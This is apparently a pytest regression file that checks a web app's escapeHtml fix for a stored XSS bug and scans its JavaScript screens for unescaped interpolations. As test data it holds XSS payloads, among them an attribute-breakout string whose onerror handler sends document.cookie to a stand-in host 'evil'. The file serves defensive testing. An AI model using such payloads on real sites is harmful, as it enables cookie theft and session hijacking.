"""Regression coverage for TASK-003 review-1 BLOCKING-3 (stored XSS in the
web interface) at the level available without a JS runtime/test-runner.

The project has no Node.js/browser test harness (by design - `30_impl.md`
"JS не прогонялся через реальный интерпретатор", and the test-writer brief
explicitly asks not to introduce one for this alone). These tests instead:

1. parse `escapeHtml`'s actual `.replace()` chain out of the committed JS
   source (not a hand-copied expectation) and replay that exact chain in
   Python against the concrete payload from the review finding, proving the
   real implementation neutralizes it - a change to the source is picked up
   automatically because the chain is extracted, not hardcoded;
2. assert the previously-vulnerable `textContent`/`innerHTML` trick is gone;
3. grep the three screens that interpolate `analysis.dominant_color`/
   `photo.filename` into markup for the unsafe patterns review-1 found
   (raw `${...}` inside `style="..."`, or any attribute interpolation that
   bypasses `escapeHtml`).

This is a source/text-level regression guard - it is not a substitute for a
real browser/DOM test, but it fails loudly if the fix is reverted or a new
call site reintroduces the same class of bug.
"""

import re
from pathlib import Path

import pytest

WEB_JS_DIR = Path(__file__).resolve().parent.parent / "web" / "html" / "js"
FORMAT_JS = WEB_JS_DIR / "format.js"


def _read(path: Path) -> str:
    if not path.exists():
        pytest.skip(f"{path} not found (web/ not part of this checkout)")
    return path.read_text(encoding="utf-8")


def _extract_escape_html_body() -> str:
    text = _read(FORMAT_JS)
    match = re.search(r"function escapeHtml\(value\)\s*\{(.*?)\n\}", text, re.DOTALL)
    assert match, "escapeHtml() function not found in format.js - has it been renamed/moved?"
    return match.group(1)


def _strip_line_comments(body: str) -> str:
    """Drop `//`-comment lines (the current implementation's docstring-like
    header explains, in prose, why `textContent`/`innerHTML` are no longer
    used - which would otherwise make a naive substring search on the whole
    function body self-defeating)."""
    return "\n".join(
        line for line in body.splitlines() if not line.strip().startswith("//")
    )


def _extract_replace_chain(body: str) -> list[tuple[str, str]]:
    """Pull out the ordered sequence of `.replace(/X/g, "Y")` calls from the
    function body, as (literal_char, replacement) pairs - reads the ACTUAL
    implementation rather than asserting a hardcoded expectation, so a
    revert or a reordering is caught even if this test file is never
    touched again."""
    pairs = re.findall(r'\.replace\(/(\\?.)/g,\s*"([^"]*)"\)', body)
    return [(char.lstrip("\\"), replacement) for char, replacement in pairs]


def _apply_chain(value: str, chain: list[tuple[str, str]]) -> str:
    result = value
    for char, replacement in chain:
        result = result.replace(char, replacement)
    return result


class TestEscapeHtmlNoLongerUsesTheVulnerableTrick:
    def test_does_not_use_textcontent_innerhtml_serialization(self):
        """The original (BLOCKING-3) implementation was
        `div.textContent = value; return div.innerHTML` - which the HTML
        spec only guarantees escapes `& < >`, never `"` or `'`. Assert that
        trick is gone, not just that *a* fix exists."""
        code = _strip_line_comments(_extract_escape_html_body())
        assert "innerHTML" not in code
        assert "textContent" not in code


class TestEscapeHtmlChain:
    def test_escapes_all_five_significant_characters_in_the_correct_order(self):
        """`&` must be escaped FIRST - escaping it after `<`/`>`/`"`/`'`
        would double-escape the entities those replacements just
        introduced (e.g. `&lt;` -> `&amp;lt;`)."""
        chain = _extract_replace_chain(_extract_escape_html_body())
        chars_in_order = [char for char, _ in chain]
        assert chars_in_order == ["&", "<", ">", '"', "'"]

    def test_replacement_entities_match_the_standard_html_escapes(self):
        chain = _extract_replace_chain(_extract_escape_html_body())
        assert dict(chain) == {
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#39;",
        }

    def test_review1_attribute_breakout_payload_cannot_escape_a_double_quoted_attribute(self):
        """The exact class of payload review-1 demonstrated: a filename
        containing `"` that would otherwise break out of `alt="..."` and
        inject a new attribute/handler."""
        chain = _extract_replace_chain(_extract_escape_html_body())
        payload = 'x" onerror="fetch(\'http://evil/\'+document.cookie)'

        escaped = _apply_chain(payload, chain)
        rendered = f'<img alt="{escaped}" />'

        # Exactly the two quotes the template itself wrote remain; none of
        # the payload's own quotes survived unescaped.
        assert rendered.count('"') == 2
        assert '"' not in escaped
        assert "&quot;" in escaped

    def test_script_tag_payload_is_neutralized(self):
        chain = _extract_replace_chain(_extract_escape_html_body())
        payload = "<script>alert(document.cookie)</script>"

        escaped = _apply_chain(payload, chain)

        assert "<script>" not in escaped
        assert "</script>" not in escaped
        assert "&lt;script&gt;" in escaped

    def test_single_quote_payload_cannot_escape_a_single_quoted_attribute(self):
        chain = _extract_replace_chain(_extract_escape_html_body())
        payload = "y' onerror='alert(1)"

        escaped = _apply_chain(payload, chain)
        rendered = f"<img alt='{escaped}' />"

        assert rendered.count("'") == 2
        assert "'" not in escaped
        assert "&#39;" in escaped


class TestDominantColorIsNeverInterpolatedRawIntoCss:
    """Review-1 BLOCKING-3 fix / review-2 NON_BLOCKING recommendation:
    `dominant_color` (untrusted, from the external analyzer per
    constitution.md §2.1) must never be interpolated directly into a
    `style="..."` attribute string - even HTML-escaped, that is a CSS
    injection surface. It must go through `element.style.backgroundColor`
    (DOM property assignment) instead."""

    def test_no_screen_interpolates_dominant_color_into_a_style_attribute_string(self):
        offending = []
        for js_file in WEB_JS_DIR.glob("*.js"):
            text = js_file.read_text(encoding="utf-8")
            for match in re.finditer(r'style\s*=\s*"[^"]*\$\{[^}]*\}', text):
                offending.append(f"{js_file.name}: {match.group(0)!r}")
        assert offending == [], (
            "found raw template interpolation inside a style=\"...\" attribute "
            f"(CSS injection surface): {offending}"
        )

    def test_photo_js_sets_the_swatch_color_via_the_dom_style_api(self):
        photo_js = _read(WEB_JS_DIR / "photo.js")
        assert "style.backgroundColor" in photo_js
        assert "safeCssColor" in photo_js


class TestAllFilenameInterpolationsAreEscaped:
    """`filename` is user-controlled and stored without sanitization
    (`app/services/photo_service.py`) - every screen that renders it inside
    an HTML attribute must route it through `escapeHtml` first."""

    def test_every_photo_filename_interpolation_goes_through_escape_html(self):
        offending = []
        for js_file in WEB_JS_DIR.glob("*.js"):
            if js_file.name == "format.js":
                continue
            text = js_file.read_text(encoding="utf-8")
            for match in re.finditer(r'(alt|title)="\$\{([^}]*)\}"', text):
                expr = match.group(2)
                if "escapeHtml" not in expr:
                    offending.append(f"{js_file.name}: {match.group(0)!r}")
        assert offending == [], f"unescaped filename/attribute interpolation: {offending}"
